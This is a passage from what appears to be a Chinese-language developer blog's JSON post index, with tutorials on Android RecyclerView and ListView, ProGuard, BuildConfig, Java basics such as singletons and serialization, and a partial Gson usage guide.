android:drawable=&quot;@color/color_item_normal&quot;&gt;&lt;/item&gt;&lt;/selector&gt; Activity中去设置监听： 12345678910111213141516171819mAdapter.setOnItemClickLitener(new OnItemClickLitener()&#123; @Override public void onItemClick(View view, int position) &#123; Toast.makeText(HomeActivity.this, position + \" click\", Toast.LENGTH_SHORT).show(); &#125; @Override public void onItemLongClick(View view, int position) &#123; Toast.makeText(HomeActivity.this, position + \" long click\", Toast.LENGTH_SHORT).show(); mAdapter.removeData(position); &#125;&#125;); 测试效果：ok，到此我们基本介绍了RecylerView常见用法，包含了： 系统提供了几种LayoutManager的使用； 如何通过自定义ItemDecoration去设置分割线，或者一些你想作为分隔的drawable，注意这里 巧妙的使用了系统的listDivider属性，你可以尝试添加使用divider和dividerHeight属性。 如何使用ItemAnimator为RecylerView去添加Item移除、添加的动画效果。 介绍了如何添加ItemClickListener与ItemLongClickListener。 可以看到RecyclerView可以实现： ListView的功能 GridView的功能 横向ListView的功能，参考Android 自定义RecyclerView 实现真正的Gallery效果 横向ScrollView的功能 瀑布流效果 便于添加Item增加和移除动画 整个体验下来，感觉这种插拔式的设计太棒了，如果系统再能提供一些常用的分隔符，多添加些动画效果就更好了。通过简单改变下LayoutManager，就可以产生不同的效果，那么我们可以根据手机屏幕的宽度去动态设置LayoutManager，屏幕宽度一般的，显示为ListView；宽度稍大的显示两列的GridView或者瀑布流（或者横纵屏幕切换时变化，有点意思）；显示的列数和宽度成正比。甚至某些特殊屏幕，让其横向滑动再选择一个nice的动画效果，相信这种插件式的编码体验一定会让你迅速爱上RecyclerView。 参考资料Android 自定义RecyclerView 实现真正的Gallery效果A First Glance at Android’s RecyclerViewhttps://github.com/gabrielemariotti/RecyclerViewItemAnimatorsDividerItemDecoration","categories":[{"name":"android","slug":"android","permalink":"https://superxlcr.github.io/categories/android/"}],"tags":[{"name":"android","slug":"android","permalink":"https://superxlcr.github.io/tags/android/"},{"name":"应用","slug":"应用","permalink":"https://superxlcr.github.io/tags/应用/"},{"name":"view","slug":"view","permalink":"https://superxlcr.github.io/tags/view/"}]},{"title":"记一次寻找http代理修改过程","slug":"记一次寻找http代理修改过程","date":"2017-08-14T11:33:45.000Z","updated":"2020-05-11T07:23:44.907Z","comments":true,"path":"2017/08/14/记一次寻找http代理修改过程/","link":"","permalink":"https://superxlcr.github.io/2017/08/14/记一次寻找http代理修改过程/","excerpt":"","text":"最近在使用fiddler抓取http包时，总是收到proxy was changed的提示： 由于博主并没有主动运行vpn等工具，因此十分疑惑是什么进程修改了http的代理经过百度，终于有一篇文章解答了博主的疑惑：http://www.telerik.com/forums/how-to-auto-reset-fiddler-when-%27system-proxy-was-changed%27 总的来说，查找是什么进程修改http代理方法如下：首先，我们需要下载SysInternals的Process Monitor工具：https://docs.microsoft.com/zh-cn/sysinternals/downloads/procmon 打开Process Monitor后，设置Filter，规则为Path contains PROXYSERVER： 应用后即可查看到有哪些进程在修改我们的http代理了：","categories":[{"name":"计算机网络","slug":"计算机网络","permalink":"https://superxlcr.github.io/categories/计算机网络/"}],"tags":[{"name":"计算机网络","slug":"计算机网络","permalink":"https://superxlcr.github.io/tags/计算机网络/"},{"name":"Http","slug":"Http","permalink":"https://superxlcr.github.io/tags/Http/"}]},{"title":"关于一些基础的Java问题的解答（九）","slug":"关于一些基础的Java问题的解答（九）","date":"2017-08-10T09:07:49.000Z","updated":"2020-05-11T07:23:44.830Z","comments":true,"path":"2017/08/10/关于一些基础的Java问题的解答（九）/","link":"","permalink":"https://superxlcr.github.io/2017/08/10/关于一些基础的Java问题的解答（九）/","excerpt":"","text":"上一篇文章的传送门：关于一些基础的Java问题的解答（八） Collections工具类的shuffle方法Java中Collections类的shuffle()方法的作用是将List中的内容随机打乱顺序其源码如下： 1234567891011121314151617181920212223242526272829public static void shuffle(List&lt;?&gt; list) &#123; if (r == null) &#123; r = new Random(); &#125; shuffle(list, r); &#125; private static Random r; public static void shuffle(List&lt;?&gt; list, Random rnd) &#123; int size = list.size(); if (size &lt; SHUFFLE_THRESHOLD || list instanceof RandomAccess) &#123; for (int i=size; i&gt;1; i--) swap(list, i-1, rnd.nextInt(i)); &#125; else &#123; Object arr[] = list.toArray(); // Shuffle array for (int i=size; i&gt;1; i--) swap(arr, i-1, rnd.nextInt(i)); // Dump array back into list ListIterator it = list.listIterator(); for (int i=0; i&lt;arr.length; i++) &#123; it.next(); it.set(arr[i]); &#125; &#125; &#125; shuffle方法使用了Random类，通过把list其中的元素随机交换size次，打乱list元素的顺序 Java 找不到或无法加载主类如果在你没有打错类名的前提下，可能是Java解释器搜索的目录没有包含当前目录，一般而言Java解释器会搜索环境变量下的ClassPath目录因此我们可以为我们的ClassPath环境变量添加：.;也可以调用java解释器的时候带上参数：-cp . Java中单件模式的实现方法在Java中，单件模式的实现方法有以下五种：懒汉、饿汉、静态内部类、枚举以及双重校验锁懒汉的实现方法如下（只有在使用的时候才进行初始化）： 1234567891011121314public class SingleInstance &#123; public static SingleInstance instance = null; public static synchronized SingleInstance getInstance() &#123; if (instance == null) &#123; instance = new SingleInstance(); &#125; return instance; &#125; private SingleInstance() &#123;&#125; &#125; 饿汉的实现方法如下（提前进行初始化）： 1234567891011public class SingleInstance &#123; public static SingleInstance instance = new SingleInstance(); public static SingleInstance getInstance() &#123; return instance; &#125; private SingleInstance() &#123;&#125; &#125; 静态内部类的实现方法如下（只有在初次使用时才会加载内部静态类，实例化单件实例）： 123456789101112public class SingleInstance &#123; public static SingleInstance getInstance() &#123; return InnerStaticClass.instance; &#125; private SingleInstance() &#123;&#125; private static class InnerStaticClass &#123; private static SingleInstance instance = new SingleInstance(); &#125;&#125; 枚举的实现方法如下： 1234567public enum SingleInstance &#123; INSTANCE; private SingleInstance() &#123;&#125; &#125; 双重校验锁实现方法： 123456789101112131415161718public class SingleInstance &#123; public static SingleInstance instance; public static SingleInstance getInstance() &#123; if (instance == null) &#123; synchronized (SingleInstance.class) &#123; if (instance == null) &#123; instance = new SingleInstance(); &#125; &#125; &#125; return instance; &#125; private SingleInstance() &#123;&#125; &#125; 如何判断两个float是否相等首先两个float是不能直接使用==来判断是否相等的，一般而言，我们有两种写法：较严格的： 1Math.abs(a-b) &lt;= 0 较宽松的： 1Math.abs(a-b) &lt;= 0.00000001 Java对象序列化在Java中，序列化对象是一种把对象转换为字节码的方法，我们可以通过ObjectOutputStream以及ObjectInputStream来实现对象的序列化以及反序列化当我们需要把某个对象进行序列化时，我们需要为对象implement Serializable接口来“标记”可以序列化该对象序列化以及反序列化能为我们保存对象的成员变量，当我们不希望某个成员变量被序列化时，我们可以使用transient关键字来标记它反序列化时，系统通过 static final long serialVersionUID 来判断字节码与class是否一致，如果不一致则会抛出异常一般而言，serialVersionUID如果没有显示声明，系统会根据class的成员变量为其设置一个值（这将会导致class成员变量修改时我们的反序列化出现异常，不过我们可以通过自行显示设置 serialVersionUID来解决这个问题）一般而言，系统会自行处理对象序列化以及反序列化的过程，不过我们也可以通过实现以下方法来对该过程进行控制（系统序列化之前会通过反射判断是否有对应方法，如果有则把流程交给其处理）： 123private void writeObject(java.io.ObjectOutputStream out) throws IOExceptionprivate void readObject(java.io.ObjectInputStream in) throws IOException, ClassNotFoundException;private void readObjectNoData() throws ObjectStreamException;","categories":[{"name":"java","slug":"java","permalink":"https://superxlcr.github.io/categories/java/"}],"tags":[{"name":"基础知识","slug":"基础知识","permalink":"https://superxlcr.github.io/tags/基础知识/"},{"name":"java","slug":"java","permalink":"https://superxlcr.github.io/tags/java/"}]},{"title":"ProGuard详解","slug":"ProGuard详解","date":"2017-08-10T08:31:48.000Z","updated":"2020-05-11T07:23:44.730Z","comments":true,"path":"2017/08/10/ProGuard详解/","link":"","permalink":"https://superxlcr.github.io/2017/08/10/ProGuard详解/","excerpt":"","text":"简介ProGuard是一个开源的Java代码混淆器。它可以混淆Android项目里面的java代码，对的，你没看错，仅仅是java代码。它是无法混淆Native代码，资源文件drawable、xml等。 ProGuard作用 压缩: 移除无效的类、属性、方法等 优化: 优化字节码，并删除未使用的结构 混淆: 将类名、属性名、方法名混淆为难以读懂的字母，比如a,b,c； 混淆注意事项不能混淆 在AndroidManifest中配置的类，比如四大组件 JNI调用的方法 反射用到的类 WebView中JavaScript调用的方法 Layout文件引用到的自定义View 一些引入的第三方库（一般都会有混淆说明的） 推荐两个开源项目，里面收集了一些第三方库的混淆规则android-proguard-snippetsandroid-proguard-cn Crash信息处理代码混淆的时候记得加上在混淆文件里面记得加上这句： 12# keep住源文件以及行号-keepattributes SourceFile,LineNumberTable 否则你看到的崩溃信息就会变成这样子:（图片来自bugly） 这里推荐bugly的一篇文章： http://bugly.qq.com/bbs/forum.php?mod=viewthread&amp;tid=26&amp;extra=page%3D1 ProGuard使用常用语法1234567891011121314// 从给定的文件中读取配置参数-include &#123;filename&#125; // 指定基础目录为以后相对的档案名称-basedirectory &#123;directoryname&#125;// 指定要处理的应用程序jar,war,ear和目录 -injars &#123;class_path&#125; // 指定处理完后要输出的jar,war,ear和目录的名称 -outjars &#123;class_path&#125; // 指定要处理的应用程序jar,war,ear和目录所需要的程序库文件 -libraryjars &#123;classpath&#125; // 指定不去忽略非公共的库类。-dontskipnonpubliclibraryclasses// 指定不去忽略包可见的库类的成员。-dontskipnonpubliclibraryclassmembers 保留1234567891011121314// 保护指定的类文件和类的成员-keep &#123;Modifier&#125; &#123;class_specification&#125; // 保护指定类的成员，如果此类受到保护他们会保护的更好-keepclassmembers &#123;modifier&#125; &#123;class_specification&#125; // 保护指定的类和类的成员，但条件是所有指定的类和类成员是要存在。-keepclasseswithmembers &#123;class_specification&#125; // 保护指定的类和类的成员的名称（如果他们不会压缩步骤中删除）-keepnames &#123;class_specification&#125; // 保护指定的类的成员的名称（如果他们不会压缩步骤中删除）-keepclassmembernames &#123;class_specification&#125; // 保护指定的类和类的成员的名称，如果所有指定的类成员出席（在压缩步骤之后）-keepclasseswithmembernames &#123;class_specification&#125; // 列出类和类的成员-keep选项的清单，标准输出到给定的文件-printseeds &#123;filename&#125; 压缩123-dontshrink 不压缩输入的类文件-printusage &#123;filename&#125;-whyareyoukeeping &#123;class_specification&#125; 优化123-dontoptimize 不优化输入的类文件-assumenosideeffects &#123;class_specification&#125; 优化时假设指定的方法，没有任何副作用-allowaccessmodification 优化时允许访问并修改有修饰符的类和类的成员 混淆123456789101112131415161718// 不混淆输入的类文件-dontobfuscate // 使用给定文件中的关键字作为要混淆方法的名称-obfuscationdictionary &#123;filename&#125; // 混淆时应用侵入式重载-overloadaggressively // 确定统一的混淆类的成员名称来增加混淆-useuniqueclassmembernames // 重新包装所有重命名的包并放在给定的单一包中-flattenpackagehierarchy &#123;package_name&#125; // 重新包装所有重命名的类文件中放在给定的单一包中-repackageclass &#123;package_name&#125; // 混淆时不会产生形形色色的类名-dontusemixedcaseclassnames // 保护给定的可选属性，例如LineNumberTable, LocalVariableTable, SourceFile, Deprecated, Synthetic, Signature, and InnerClasses.-keepattributes &#123;attribute_name,…&#125; // 设置源文件中给定的字符串常量-renamesourcefileattribute &#123;string&#125; 通配符匹配规则1234567891011121314151617181920212223242526272829303132？ 匹配单个字符*匹配类名中的任何部分，但不包含额外的包名**匹配类名中的任何部分，并且可以包含额外的包名%匹配任何基础类型的类型名***匹配任意类型名 ,包含基础类型/非基础类型...匹配任意数量、任意类型的参数&lt;init&gt;匹配任何构造器&lt;ifield&gt;匹配任何字段名&lt;imethod&gt;匹配任何方法*(当用在类内部时)匹配任何字段和方法$指内部类 更详细的语法请戳:http://proguard.sourceforge.net/manual/usage.html#classspecification Android Studio中使用方法按照上面的语法规则编写proguard-rules.pro后，需要在build.gradle中配置，需要混淆的时候，设置minifyEnabled为true即可 12345678910buildTypes &#123; debug &#123; minifyEnabled false &#125; release &#123; signingConfig signingConfigs.release minifyEnabled true proguardFiles &apos;proguard-rules.pro&apos; &#125;&#125; Eclipse 中使用方法 在工程目录下有个描述文件project.properties, 注意不是proguard-project.txt文件(当时因为这个原因一直失败)，添加一句话，启用ProGuard; 1234// 原文件内容：# proguard.config=$&#123;sdk.dir&#125;/tools/proguard/proguard-android.txt:proguard-project.txt// 修改后内容(其实只是去除注释，并未添加):proguard.config=$&#123;sdk.dir&#125;/tools/proguard/proguard-android.txt:proguard-project.txt 这样，Proguard就可以使用了。当我们正常通过Android Tools导出Application Package时（或者使用ant执行release打包），Proguard就会自动启用，优化混淆你的代码。 这一步并不是必要的，第一步中已经添加了sdk目录下的混淆工具，但是为了避免各个项目出现混乱（直接添加导致所有的项目都是使用sdk目录下的ProGard工具）；因此往往会将proguard-android.txt复制到项目的跟目录下，使每个项目各自拥有独立的ProGuard文件； 123// 因此project.properties修改后：proguard.config=proguard-android.txt:proguard-project.txt// proguard-project.txt表示项目目录下的proguard-project.txt文件 ProGuard的输出文件说明混淆后，会在/build/proguard/目录下输出下面的文件 (Eclipse使用Export Android Application会在项目根目录下产生proguard目录； dump.txt 描述apk文件中所有类文件间的内部结构。 mapping.txt 列出了原始的类，方法，和字段名与混淆后代码之间的映射。 seeds.txt 列出了未被混淆的类和成员; usage.txt 列出了从apk中删除的代码 ;","categories":[{"name":"android","slug":"android","permalink":"https://superxlcr.github.io/categories/android/"}],"tags":[{"name":"android","slug":"android","permalink":"https://superxlcr.github.io/tags/android/"},{"name":"编译","slug":"编译","permalink":"https://superxlcr.github.io/tags/编译/"}]},{"title":"Android常见问题总结（六）","slug":"Android常见问题总结（六）","date":"2017-08-08T11:54:28.000Z","updated":"2020-05-11T07:23:44.583Z","comments":true,"path":"2017/08/08/Android常见问题总结（六）/","link":"","permalink":"https://superxlcr.github.io/2017/08/08/Android常见问题总结（六）/","excerpt":"","text":"上一篇博客传送门：Android常见问题总结（五） 如何处理Android Crash 并重启手机一般而言，发生了APP Crash是由于我们的程序抛出了我们未捕获的RuntimeException在Java中，我们可以通过setDefaultUncaughtExceptionHandler方法为某个线程设置默认未捕获异常处理器，当程序抛出未捕获异常时，会交由改处理器处理Android的默认UncaughtExceptionHandler为弹出Dialog提醒用户APP Crash，并杀死进程退出程序我们可以通过编写自己的UncaughtExceptionHandler来处理APP Crash的问题： 12345678Thread.setDefaultUncaughtExceptionHandler(new Thread.UncaughtExceptionHandler() &#123; @Override public void uncaughtException(Thread t, Throwable e) &#123; Intent intent = new Intent(MainActivity.this, MainActivity.class); startActivity(intent); Process.killProcess(Process.myPid()); &#125;&#125;); 下面例子中，点击按钮会抛出一个运行时异常，上图为未设置Handler之前，下图为设置Handler之后： ) 如何把view转化为bitmap可以使用getDrawingCache方法： 12345678// 设置能否缓存图片信息（drawing cache）view.setDrawingCacheEnabled(true);// 如果能够缓存图片，则创建图片缓存view.buildDrawingCache();// 如果图片已经缓存，返回一个bitmapBitmap bitmap = view.getDrawingCache();// 释放缓存占用的资源view.destroyDrawingCache(); library 与 app资源同名冲突问题假设有以下场景： 在一个Project中有两个module，一个是应用app，另一个是android的library：mylibrary两个module中存在着相同的资源名称 这种情况会导致什么问题呢？会导致mylibrary module中的activity_main.xml被覆盖，无法获取 在网上查到的R类索引生成规则如下所示： 资源ID是一个4字节的无符号整数，其中，最高字节表示Package ID，次高字节表示Type ID，最低两字节表示Entry ID。Package ID相当于是一个命名空间，限定资源的来源。Android系统当前定义了两个资源命令空间，其中一个系统资源命令空间，它的Package ID等于0x01，另外一个是应用程序资源命令空间，它的Package ID等于0x7f。所有位于[0x01, 0x7f]之间的Package ID都是合法的，而在这个范围之外的都是非法的Package ID。前面提到的系统资源包package-export.apk的Package ID就等于0x01，而我们在应用程序中定义的资源的Package ID的值都等于0x7f，这一点可以通过生成的R.java文件来验证。 Type ID是指资源的类型ID。资源的类型有animator、anim、color、drawable、layout、menu、raw、string和xml等等若干种，每一种都会被赋予一个ID。Entry ID是指每一个资源在其所属的资源类型中所出现的次序。注意，不同类型的资源的Entry ID有可能是相同的，但是由于它们的类型不同，我们仍然可以通过其资源ID来区别开来。 由于名称相同，两个module会对该资源生成相同的索引即（app.R.layout.activity_main == mylibrary.R.layout.activity_main）如果app module依赖mylibrary module，那么最终生成的apk中所有的资源文件res和R类都会被集中到一起，也就是说mylibrary中的activity_main会被完全覆盖原本在mylibrary module中的获取的activity_main资源均会变为app中的activity_main资源 stackoverflow对此问题给出的解决方案是：为你的android library资源添加相关的前缀，如AppCompat的前缀为abc_https://stackoverflow.com/questions/42513509/is-there-any-way-in-android-module-to-pick-up-resources-from-its-own-module-and Android 扬声器与听筒切换要实现扬声器与听筒的切换.而android中实现对音量和振铃模式的控制主要通过AudioManager类来实现. 获取到AudioManager后，我们可以通过其几个关键的方法改变扬声器与听筒的状态： isSpeakerphoneOn：用于检测当前是否开启了扬声器 setSpeakerphoneOn：设置是否打开扬声器 setMode：设置音频模式，设置扬声器时，使用MODE_NORMAL，设置听筒时，使用MODE_IN_COMMUNICATION 具体实现如下： 1234567891011/** * 设置是否开启扬声器 * @param isSpeakerOn 是否开启 */public void setSpeakerphone(boolean isSpeakerOn) &#123; AudioManager audioManager = (AudioManager) getSystemService(AUDIO_SERVICE); if (audioManager != null) &#123; audioManager.setMode(isSpeakerOn ? AudioManager.MODE_NORMAL : AudioManager.MODE_IN_COMMUNICATION); audioManager.setSpeakerphoneOn(isSpeakerOn); &#125;&#125; 值得注意的是直接调用这个方法并不能切换生效，我们还需要申请MODIFY_AUDIO_SETTINGS的权限才行： 1&lt;uses-permission android:name=\"android.permission.MODIFY_AUDIO_SETTINGS\" /&gt; 关于addView后宽高的一些细节对于ViewGroup#addView方法，我们应该都不陌生，该方法经常可以用来动态添加子View但如果我们使用时不注意的话，添加到ViewGroup中的View的宽高往往并不会如我们所愿想要避免这种情况，我们就需要确保调用addView方法时，我们的View具有正确的LayoutParams（宽高信息包含在里面），以下有三种方式确认我们的View设置了正确的LayoutParams： 在使用LayoutInflater时，传入父ViewGroup：LayoutInflater只有当我们传入父ViewGroup时，才会为我们解析的View设置正确的LayoutParams，否则其实我们写在xml上的布局信息并不会准确的生效 在addView之前，调用setLayoutParams设置 调用addView带有LayoutParams参数的方法 一般而言，最常用的ViewGroup#addView方法如下所示： 123456789101112131415161718192021 public void addView(View child) &#123; addView(child, -1); &#125; public void addView(View child, int index) &#123; if (child == null) &#123; throw new IllegalArgumentException(\"Cannot add a null child view to a ViewGroup\"); &#125; LayoutParams params = child.getLayoutParams(); if (params == null) &#123; params = generateDefaultLayoutParams(); if (params == null) &#123; throw new IllegalArgumentException(\"generateDefaultLayoutParams() cannot return null\"); &#125; &#125; addView(child, index, params); &#125;protected LayoutParams generateDefaultLayoutParams() &#123; return new LayoutParams(LayoutParams.WRAP_CONTENT, LayoutParams.WRAP_CONTENT); &#125; 从第11行我们可以看出，如果我们动态添加的View并没有设置好相应的LayoutParams，系统变会填充上一个默认的LayoutParams，而大多数情况下，这个LayoutParams的布局方式并不是我们想要的 这也是为什么有时候addView之后，我们添加的View宽高为0的原因之一","categories":[{"name":"android","slug":"android","permalink":"https://superxlcr.github.io/categories/android/"}],"tags":[{"name":"android","slug":"android","permalink":"https://superxlcr.github.io/tags/android/"},{"name":"基础知识","slug":"基础知识","permalink":"https://superxlcr.github.io/tags/基础知识/"}]},{"title":"Android BuildConfig类","slug":"Android-BuildConfig类","date":"2017-08-06T07:04:02.000Z","updated":"2020-05-11T07:23:44.500Z","comments":true,"path":"2017/08/06/Android-BuildConfig类/","link":"","permalink":"https://superxlcr.github.io/2017/08/06/Android-BuildConfig类/","excerpt":"","text":"什么是BuildConfig类BuildConfig是android studio在打包时自动生成的一个java类，在项目工程的build/generated/source/buildConfig目录下，打开这个目录可以发现会有多个不同的目录来存放BuildConfig.java类，一般会有androidTest、debug、release等多个目录，对应着不同的buildTypes以及flavors。一般情况下，这些目录中的BuildConfig类中有相同的常量字段： 字段 含义 DEBUG 是否为调试版本 APPLICATION_ID 应用id（包名） BUILD_TYPE 构建类型（一般为debug与release） FLAVOR 渠道 VERSION_CODE 版本号 VERSION_NAME 版本名 一般而言，我们可以通过访问BuildConfig类的常量来进行一些判断处理，比如： 通过判断DEBUG来确定是否为调试模式，是否打印日志 通过判断VERSION_CODE与VERSION_NAME来确定应用版本，是否需要进行升级 通过判断FLAVOR来获取应用的渠道信息，进行渠道统计等 如何在BuildConfig类中添加常量BuildConfig是android studio自动生成的一个类，就是说我们不能手动去修改这个类里面的内容，但我们可以在Gradle构建脚本中通过相应的函数来为BuildConfig类添加常量。 例子如下： 1234567891011121314buildTypes &#123; release &#123; minifyEnabled true signingConfig signingConfigs.release proguardFiles getDefaultProguardFile('proguard-project.txt'), 'proguard-rules.pro' buildConfigField(\"String\", \"TEST\", 'Release') &#125; debug &#123; signingConfig signingConfigs.debug proguardFiles getDefaultProguardFile('proguard-project.txt'), 'proguard-rules.pro' buildConfigField(\"String\", \"TEST\", 'debug') &#125; &#125; 在上面的例子中，我们通过buildConfigField函数，在release与debug两种buildTypes的BuildConfig类中，添加了TEST常量字段，并设置了相应的值。buildConfigField函数如下： 1234567891011121314151617181920212223/** * Adds a new field to the generated BuildConfig class. * * &lt;p&gt;The field is generated as: &lt;code&gt;&lt;type&gt; &lt;name&gt; = &lt;value&gt;;&lt;/code&gt; * * &lt;p&gt;This means each of these must have valid Java content. If the type is a String, then the * value should include quotes. * * @param type the type of the field * @param name the name of the field * @param value the value of the field */ public void buildConfigField( @NonNull String type, @NonNull String name, @NonNull String value) &#123; ClassField alreadyPresent = getBuildConfigFields().get(name); if (alreadyPresent != null) &#123; logger.info(\"BuildType(&#123;&#125;): buildConfigField '&#123;&#125;' value is being replaced: &#123;&#125; -&gt; &#123;&#125;\", getName(), name, alreadyPresent.getValue(), value); &#125; addBuildConfigField(AndroidBuilder.createClassField(type, name, value)); &#125; 该方法需要传入三个参数，第一个参数为要定义的常量的类型，第二个参数为该常量的命名，第三个参数为该常量的值。在Gradle中调用该方法后，我们可以在BuildConfig类中找到对应的常量 使用BuildConfig.DEBUG的一些问题当我们的项目包含一些jar或者aar的module，在使用BuildConfig.DEBUG这个常量时，会遇到如下问题：尽管我们的app的module使用debug的buildType来进行构建，但库module却使用的是release的buildType进行构建。也就是说，在app的module中，我们获取BuildConfig.DEBUG变量为true，但在依赖的库module中BuildConfig.DEBUG确是false。该问题的解决方法有以下几种： 在library的配置里面使用 publishNonDefault true 在library的配置里面使用 defaultPublishConfig “debug” 在主程序的配置里面使用 compile project(path: ‘:library’, configuration:’debug’) 使用一些Gradle的hook的黑科技 该问题的更详细讨论见：http://www.jianshu.com/p/1907bffef0a3","categories":[{"name":"android","slug":"android","permalink":"https://superxlcr.github.io/categories/android/"}],"tags":[{"name":"android","slug":"android","permalink":"https://superxlcr.github.io/tags/android/"}]},{"title":"Android列表滑动加载实现","slug":"Android列表滑动加载实现","date":"2017-08-03T12:52:26.000Z","updated":"2020-05-11T07:23:44.564Z","comments":true,"path":"2017/08/03/Android列表滑动加载实现/","link":"","permalink":"https://superxlcr.github.io/2017/08/03/Android列表滑动加载实现/","excerpt":"","text":"Android列表滑动加载主要依靠ListView的OnScrollListener实现，在此先介绍一下ListView的OnScrollListener接口： 123456789public interface OnScrollListener &#123; public static int SCROLL_STATE_IDLE = 0; public static int SCROLL_STATE_TOUCH_SCROLL = 1; public static int SCROLL_STATE_FLING = 2; public void onScrollStateChanged(AbsListView view, int scrollState); public void onScroll(AbsListView view, int firstVisibleItem, int visibleItemCount, int totalItemCount);&#125; 可以看到，OnScrollListener接口有三个静态滚动状态的变量，及两个要实现的方法。 onScrollStateChanged滚动状态发生变化时，系统会回调这个方法。滚动状态会被赋值到scrollState，scrollState的值如下： scrollState值 含义 SCROLL_STATE_IDLE 不滚动时的状态，通常会在滚动停止时监听到此状态 SCROLL_STATE_TOUCH_SCROLL 正在滚动的状态 SCROLL_STATE_FLING 用力快速滑动时可监听到此值 onScroll滚动过程中会回调此方法。详细的参数含义： onScroll方法参数 含义 firstVisibleItem 第一个可视的项，这里是整个item都可视的项。被挡住一点的item都不符合 visibleItemCount 可视的项的个数 totalItemCount 总item的个数 实现滑动加载的例子如下： 1234567891011121314151617181920212223242526272829303132333435363738394041public class MainActivity extends AppCompatActivity &#123; private ListView listView; private BaseAdapter adapter; private int counter; @Override protected void onCreate(Bundle savedInstanceState) &#123; super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); listView = (ListView)findViewById(R.id.list_view); final ArrayList&lt;Integer&gt; list = new ArrayList&lt;&gt;(); counter = 0; int oldCounter = counter; for (counter = oldCounter; counter &lt; oldCounter + 15; counter++) &#123; list.add(counter); &#125; adapter = new ArrayAdapter&lt;Integer&gt;(this, android.R.layout.simple_list_item_1, list); listView.setAdapter(adapter); listView.setOnScrollListener(new AbsListView.OnScrollListener() &#123; @Override public void onScrollStateChanged(AbsListView view, int scrollState) &#123; &#125; @Override public void onScroll(AbsListView view, int firstVisibleItem, int visibleItemCount, int totalItemCount) &#123; if (firstVisibleItem != 0) &#123; // 不为0则表示有下拉动作 if ((firstVisibleItem + visibleItemCount) &gt; totalItemCount - 2) &#123; // 当前第一个完全可见的item再下拉一个页面长度，即变为倒数第二个时 // 在此加载数据 int oldCounter = counter; for (counter = oldCounter; counter &lt; oldCounter + 15; counter++) &#123; list.add(counter); &#125; adapter.notifyDataSetChanged(); &#125; &#125; &#125; &#125;); &#125;&#125; 布局文件为一个listView，在此不贴出了。 效果如下：","categories":[{"name":"android","slug":"android","permalink":"https://superxlcr.github.io/categories/android/"}],"tags":[{"name":"android","slug":"android","permalink":"https://superxlcr.github.io/tags/android/"},{"name":"应用","slug":"应用","permalink":"https://superxlcr.github.io/tags/应用/"}]},{"title":"Gson简易使用指南","slug":"Gson简易使用指南","date":"2017-08-03T02:34:22.000Z","updated":"2020-05-11T07:23:44.684Z","comments":true,"path":"2017/08/03/Gson简易使用指南/","link":"","permalink":"https://superxlcr.github.io/2017/08/03/Gson简易使用指南/","excerpt":"","text":"你真的会用Gson吗?Gson使用指南本文为作者根据日常使用结合Gson源码注释及wiki所作的原创内容，转载请注明出处。 本文链接：http://www.jianshu.com/p/e740196225a4 JSON (官网) 是一种文本形式的数据交换格式，它比XML更轻量、比二进制容易阅读和编写，调式也更加方便。其重要性不言而喻。解析和生成的方式很多，Java中最常用的类库有：JSON-Java、Gson、Jackson、FastJson等。 注：此系列基于Gson 2.4。对Gson使用很自信的大大可以点击关闭啦。本篇文章的主要内容： Gson的基本用法 属性重命名 @SerializedName 注解的使用 Gson中使用泛型 Gson的基本用法Gson提供了fromJson() 和toJson() 两个直接用于解析和生成的方法，前者实现反序列化，后者实现了序列化。同时每个方法都提供了重载方法，我常用的总共有5个。基本数据类型的解析 12345Gson gson = new Gson();int i = gson.fromJson(\"100\", int.class); //100double d = gson.fromJson(\"\\\"99.99\\\"\", double.class); //99.99boolean b = gson.fromJson(\"true\", boolean.class); // trueString str = gson.fromJson(\"String\", String.class); // String 注：不知道你是否注意到了第2、3行有什么不一样没基本数据类型的生成 1234Gson gson = new Gson();String jsonNumber = gson.toJson(100); // 100String jsonBoolean = gson.toJson(false); // falseString jsonString = gson.toJson(\"String\"); //\"String\" POJO类的生成与解析 123456public class User &#123; //省略其它 public String name; public int age; public String emailAddress;&#125; 生成JSON： 123Gson gson = new Gson();User user = new User(\"怪盗kidou\",24);String jsonObject = gson.toJson(user); // &#123;\"name\":\"怪盗kidou\",\"age\":24&#125; 解析JSON： 123Gson gson = new Gson();String jsonString = \"&#123;\\\"name\\\":\\\"怪盗kidou\\\",\\\"age\\\":24&#125;\";User user = gson.fromJson(jsonString, User.class); 属性重命名 @SerializedName 注解的使用从上面POJO的生成与解析可以看出json的字段和值是的名称和类型是一一对应的，但也有一定容错机制(如第一个例子第3行将字符串的99.99转成double型，你可别告诉我都是字符串啊)，但有时候也会出现一些不和谐的情况，如： 期望的json格式 1&#123;&quot;name&quot;:&quot;怪盗kidou&quot;,&quot;age&quot;:24,&quot;emailAddress&quot;:&quot;ikidou@example.com&quot;&#125; 实际 1&#123;&quot;name&quot;:&quot;怪盗kidou&quot;,&quot;age&quot;:24,&quot;email_address&quot;:&quot;ikidou@example.com&quot;&#125; 这对于使用PHP作为后台开发语言时很常见的情况，php和js在命名时一般采用下划线风格，而Java中一般采用的驼峰法，让后台的哥们改吧 前端和后台都不爽，但要自己使用下划线风格时我会感到不适应，怎么办?难到没有两全齐美的方法么?我们知道Gson在序列化和反序列化时需要使用反射，说到反射就不得不想到注解,一般各类库都将注解放到annotations包下，打开源码在com.google.gson包下果然有一个annotations，里面有一个SerializedName的注解类，这应该就是我们要找的。那么对于json中email_address这个属性对应POJO的属性则变成： 12@SerializedName(\"email_address\")public String emailAddress; 这样的话，很好的保留了前端、后台、Android/java各自的命名习惯。你以为这样就完了么?如果接中设计不严谨或者其它地方可以重用该类，其它字段都一样，就emailAddress 字段不一样，比如有下面三种情况那怎么?重新写一个? 1&#123;&quot;name&quot;:&quot;怪盗kidou&quot;,&quot;age&quot;:24,&quot;emailAddress&quot;:&quot;ikidou@example.com&quot;&#125; 1&#123;&quot;name&quot;:&quot;怪盗kidou&quot;,&quot;age&quot;:24,&quot;email_address&quot;:&quot;ikidou@example.com&quot;&#125; 1&#123;&quot;name&quot;:&quot;怪盗kidou&quot;,&quot;age&quot;:24,&quot;email&quot;:&quot;ikidou@example.com&quot;&#125; 为POJO字段提供备选属性名 SerializedName注解提供了两个属性，上面用到了其中一个，别外还有一个属性alternate，接收一个String数组。 注：alternate需要2.4版本 12@SerializedName(value = \"emailAddress\", alternate = &#123;\"email\", \"email_address\"&#125;)public String emailAddress; 当上面的三个属性(email_address、email、emailAddress)都中出现任意一个时均可以得到正确的结果。 注：当多种情况同时出时，以最后一个出现的值为准。 1234Gson gson = new Gson();String json = 